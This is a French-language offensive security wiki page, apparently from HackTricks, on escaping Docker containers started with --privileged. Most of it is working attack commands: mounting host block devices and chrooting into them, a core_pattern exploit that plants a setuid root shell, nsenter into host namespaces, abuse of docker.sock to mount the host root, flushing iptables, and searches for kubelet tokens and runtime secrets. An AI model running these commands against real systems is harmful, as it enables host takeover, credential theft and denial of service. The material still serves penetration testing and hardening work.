# Évasion des conteneurs `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Un conteneur démarré avec `--privileged` n'est pas la même chose qu'un conteneur normal avec une ou deux permissions supplémentaires. En pratique, `--privileged` supprime ou affaiblit plusieurs des protections runtime par défaut qui empêchent normalement la charge de travail d'accéder à des ressources dangereuses de l'hôte. L'effet exact dépend encore du runtime et de l'hôte, mais pour Docker le résultat habituel est :

- all capabilities are granted
- the device cgroup restrictions are lifted
- many kernel filesystems stop being mounted read-only
- default masked procfs paths disappear
- seccomp filtering is disabled
- AppArmor confinement is disabled
- SELinux isolation is disabled or replaced with a much broader label

La conséquence importante est qu'un conteneur privilégié n'a généralement pas besoin d'un exploit subtil du noyau. Dans de nombreux cas, il peut simplement interagir directement avec des périphériques hôtes, des systèmes de fichiers du kernel exposés à l'hôte, ou des interfaces runtime, puis pivoter vers un shell de l'hôte.

## Ce que `--privileged` ne change pas automatiquement

`--privileged` ne rejoint **pas** automatiquement les namespaces PID, network, IPC ou UTS de l'hôte. Un conteneur privilégié peut toujours avoir des namespaces privés. Cela signifie que certaines chaînes d'évasion nécessitent une condition supplémentaire telle que :

- un bind mount vers l'hôte
- partage du PID de l'hôte
- networking de l'hôte
- périphériques de l'hôte visibles
- interfaces proc/sys en écriture

Ces conditions sont souvent faciles à satisfaire dans de réelles mauvaises configurations, mais elles sont conceptuellement séparées de `--privileged` lui-même.

## Voies d'évasion

### 1. Monter le disque hôte via des périphériques exposés

Un conteneur privilégié voit généralement beaucoup plus de nœuds de périphériques sous `/dev`. Si le device block de l'hôte est visible, l'évasion la plus simple est de le monter et de faire un `chroot` dans le système de fichiers hôte :
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Si la root partition n'est pas évidente, énumérez d'abord la disposition des blocs :
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Si la voie pratique est de planter un setuid helper dans un writable host mount plutôt que d'utiliser `chroot`, souvenez-vous que tous les systèmes de fichiers n'honorent pas le bit setuid. Un contrôle rapide des capacités côté hôte est :
```bash
mount | grep -v "nosuid"
```
Ceci est utile car les chemins inscriptibles sur des systèmes de fichiers `nosuid` sont beaucoup moins intéressants pour les workflows classiques "drop a setuid shell and execute it later".

Les protections affaiblies exploitées ici sont :

- exposition complète des périphériques
- capacités étendues, en particulier `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Monter ou réutiliser un bind mount hôte et `chroot`

Si le système de fichiers racine de l'hôte est déjà monté à l'intérieur du conteneur, ou si le conteneur peut créer les montages nécessaires parce qu'il est privileged, un shell de l'hôte n'est souvent qu'à un `chroot` :
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
S'il n'existe pas de bind mount du répertoire racine de l'hôte, mais que le stockage de l'hôte est accessible, créez-en un :
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ce chemin exploite :

- restrictions de montage affaiblies
- full capabilities
- absence de confinement MAC

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Abuser de `/proc/sys` ou `/sys`

Une des grandes conséquences de `--privileged` est que les protections de procfs et sysfs deviennent beaucoup plus faibles. Cela peut exposer des interfaces du noyau accessibles depuis l'hôte qui sont normalement masquées ou montées en lecture seule.

Un exemple classique est `core_pattern` :
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
D'autres chemins à grande valeur incluent :
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce chemin exploite :

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

Un container privilégié obtient les capabilities qui sont normalement retirées des containers standards, y compris `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, et bien d'autres. Cela suffit souvent à transformer une présence locale en un échappement vers l'hôte dès qu'une autre surface exposée existe.

Un exemple simple consiste à monter des systèmes de fichiers supplémentaires et à utiliser namespace entry :
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Si le PID de l'hôte est également partagé, l'étape devient encore plus courte :
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
This path abuses:

- l'ensemble par défaut des capabilities privilégiées
- le partage optionnel du PID de l'hôte

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Un privileged container se retrouve fréquemment avec l'état runtime ou les sockets de l'hôte visibles. Si un socket Docker, containerd, ou CRI-O est atteignable, l'approche la plus simple consiste souvent à utiliser l'API runtime pour lancer un second conteneur avec un accès à l'hôte :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Pour containerd :
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ce chemin exploite :

- privileged runtime exposure
- host bind mounts created through the runtime itself

Pages liées :

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Supprimer les effets secondaires de l'isolation réseau

`--privileged` n'entraîne pas, à lui seul, la jonction du namespace réseau de l'hôte, mais si le container a aussi `--network=host` ou un autre accès réseau hôte, la pile réseau complète devient modifiable :
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ce n'est pas toujours une sortie shell directe vers l'hôte, mais cela peut entraîner un déni de service, une interception de trafic ou un accès à des services de gestion accessibles uniquement via loopback.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Lire les secrets de l'hôte et l'état d'exécution

Même lorsqu'une échappée shell propre n'est pas immédiate, les containers privilégiés ont souvent un accès suffisant pour lire les secrets de l'hôte, l'état du kubelet, les métadonnées d'exécution et les systèmes de fichiers des conteneurs voisins :
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Si `/var` est monté depuis l'hôte ou si les répertoires runtime sont visibles, cela peut suffire pour lateral movement ou cloud/Kubernetes credential theft même avant d'obtenir un shell sur l'hôte.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Vérifications

Le but des commandes suivantes est de confirmer quelles privileged-container escape families sont immédiatement viables.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Ce qui est intéressant ici :

- un ensemble complet de capabilities, en particulier `CAP_SYS_ADMIN`
- exposition de proc/sys accessible en écriture
- host devices visibles
- absence de seccomp et de confinement MAC
- runtime sockets ou host root bind mounts

Chacun de ces éléments peut suffire pour la post-exploitation. Plusieurs réunis signifient généralement que le container est, en pratique, à une ou deux commandes d'une compromission de l'hôte.

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
